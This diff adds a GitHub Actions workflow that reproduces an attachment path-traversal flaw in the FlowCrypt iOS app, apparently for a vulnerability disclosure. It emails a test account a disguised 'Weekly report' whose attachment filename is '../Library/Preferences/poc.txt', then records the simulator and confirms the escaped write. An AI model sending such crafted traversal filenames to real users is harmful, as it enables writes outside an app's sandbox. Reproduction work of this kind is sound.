@@ -1,0 +1,140 @@
+name: record-path-traversal-repro
+
+# Free reproduction recording: builds the official FlowCrypt iOS app unmodified,
+# runs it in Apple's iOS Simulator on a GitHub-hosted macOS runner, signs into a
+# real test Gmail account (no mocks), receives the crafted email, taps the
+# attachment, and records the whole interaction. Then it verifies the escaped
+# write inside the app container and uploads the video + evidence as artifacts.
+#
+# macOS runners are free for public repositories. Keep this repo PUBLIC.
+#
+# Required repository secrets:
+#   REPRO_EMAIL        - test Gmail address signed into FlowCrypt
+#   REPRO_PASSWORD     - its Google password (account should have 2FA disabled so OAuth automation works)
+#   SMTP_HOST          - SMTP server used to send the crafted email (e.g. smtp.gmail.com)
+#   SMTP_PORT          - 587
+#   SMTP_USER          - SMTP username
+#   SMTP_PASS          - SMTP password / app password
+#   FROM_EMAIL         - sender address for the crafted email
+#
+# Optional secret:
+#   SIM_IOS_VERSION    - iOS runtime for the simulator appium config (default: runner's)
+
+on:
+  workflow_dispatch:
+
+jobs:
+  record:
+    runs-on: macos-15
+    timeout-minutes: 120
+
+    steps:
+      - name: Checkout official FlowCrypt iOS (pinned, unmodified)
+        uses: actions/checkout@v4
+        with:
+          repository: FlowCrypt/flowcrypt-ios
+          ref: 0b171da5fb024a491c432f5b40028f8a4077dee4
+          path: flowcrypt-ios
+
+      - name: Checkout repro harness (this repo)
+        uses: actions/checkout@v4
+        with:
+          path: repro
+
+      - name: Select Xcode
+        run: sudo xcode-select -s "$(ls -d /Applications/Xcode*.app | sort -V | tail -1)"
+
+      - name: Build official app for the iOS Simulator (no modifications)
+        working-directory: flowcrypt-ios
+        run: |
+          set -o pipefail
+          xcodebuild \
+            -project FlowCrypt.xcodeproj \
+            -scheme "Debug FlowCrypt" \
+            -configuration Debug \
+            -sdk iphonesimulator \
+            -destination 'generic/platform=iOS Simulator' \
+            -derivedDataPath /tmp/dd \
+            -skipPackagePluginValidation -skipMacroValidation \
+            CODE_SIGNING_ALLOWED=NO \
+            build | tail -40
+
+      - name: Install Appium dependencies
+        working-directory: flowcrypt-ios/appium
+        run: npm install
+
+      - name: Add repro spec + wdio config
+        run: |
+          mkdir -p flowcrypt-ios/appium/tests/specs/repro
+          cp repro/ci/appium/repro.spec.ts flowcrypt-ios/appium/tests/specs/repro/
+          cp repro/ci/appium/wdio.repro.conf.ts flowcrypt-ios/appium/config/
+          cp -R /tmp/dd/Build/Products/Debug-iphonesimulator/FlowCrypt.app flowcrypt-ios/appium/
+
+      - name: Boot simulator
+        run: |
+          SIM_UDID=$(xcrun simctl list devices available -j | python3 -c "import sys,json; d=json.load(sys.stdin); print(next(x['udid'] for v in d['devices'].values() for x in v if x['name'].startswith('iPhone') and x.get('isAvailable')))")
+          echo "SIM_UDID=$SIM_UDID" >> "$GITHUB_ENV"
+          xcrun simctl boot "$SIM_UDID" || true
+          xcrun simctl bootstatus "$SIM_UDID" -b
+
+      - name: Send the crafted email (attachment filename with traversal)
+        run: |
+          python3 repro/send-crafted-email.py \
+            --host "${{ secrets.SMTP_HOST }}" \
+            --port "${{ secrets.SMTP_PORT }}" \
+            --user "${{ secrets.SMTP_USER }}" \
+            --password "${{ secrets.SMTP_PASS }}" \
+            --from "${{ secrets.FROM_EMAIL }}" \
+            --to "${{ secrets.REPRO_EMAIL }}" \
+            --filename '../Library/Preferences/poc.txt' \
+            --content 'PWNED-BY-ATTACHMENT' \
+            --subject 'Weekly report'
+
+      - name: Run repro spec while recording the simulator screen
+        working-directory: flowcrypt-ios/appium
+        env:
+          REPRO_EMAIL: ${{ secrets.REPRO_EMAIL }}
+          REPRO_PASSWORD: ${{ secrets.REPRO_PASSWORD }}
+          SIM_UDID: ${{ env.SIM_UDID }}
+          SIM_IOS_VERSION: ${{ secrets.SIM_IOS_VERSION }}
+        run: |
+          rm -f /tmp/start_recording /tmp/tap_save /tmp/stop_recording
+          # background recorder: waits until the spec signals it is at the attachment screen
+          rm -f /tmp/repro_sim.mp4
+          ( for i in $(seq 1 900); do [ -f /tmp/start_recording ] && break; sleep 1; done; \
+            xcrun simctl io "$SIM_UDID" recordVideo --codec=h264 /tmp/repro_sim.mp4 ) &
+          npx wdio ./config/wdio.repro.conf.ts --suite repro || true
+          sleep 3
+          pkill -INT -f "simctl io" || true
+          sleep 5
+          ls -la /tmp/repro_sim.mp4 || echo "no recording produced"
+
+      - name: Verify the escaped write inside the app container
+        run: |
+          BUNDLE_ID=$(xcrun simctl listapps "$SIM_UDID" | grep -oE 'com\.flowcrypt[^"]*' | sort -u | while read b; do
+            if xcrun simctl get_app_container "$SIM_UDID" "$b" data >/dev/null 2>&1; then echo "$b"; fi
+          done | head -1)
+          echo "bundle id: $BUNDLE_ID"
+          CONTAINER=$(xcrun simctl get_app_container "$SIM_UDID" "$BUNDLE_ID" data)
+          {
+            echo "container: $CONTAINER"
+            echo
+            echo "=== Escaped file (outside Documents) ==="
+            ls -la "$CONTAINER/Library/Preferences/" | grep poc || echo "not found at Library/Preferences/poc.txt"
+            echo
+            echo "=== File content ==="
+            cat "$CONTAINER/Library/Preferences/poc.txt" || true
+            echo
+            echo "=== Documents (must NOT contain it) ==="
+            ls -la "$CONTAINER/Documents/" | grep poc || echo "confirmed: not in Documents"
+          } | tee /tmp/evidence.txt
+
+      - name: Upload video + evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: repro-video-and-evidence
+          path: |
+            /tmp/repro_sim.mp4
+            /tmp/evidence.txt
+            flowcrypt-ios/appium/tmp
+          if-no-files-found: warn
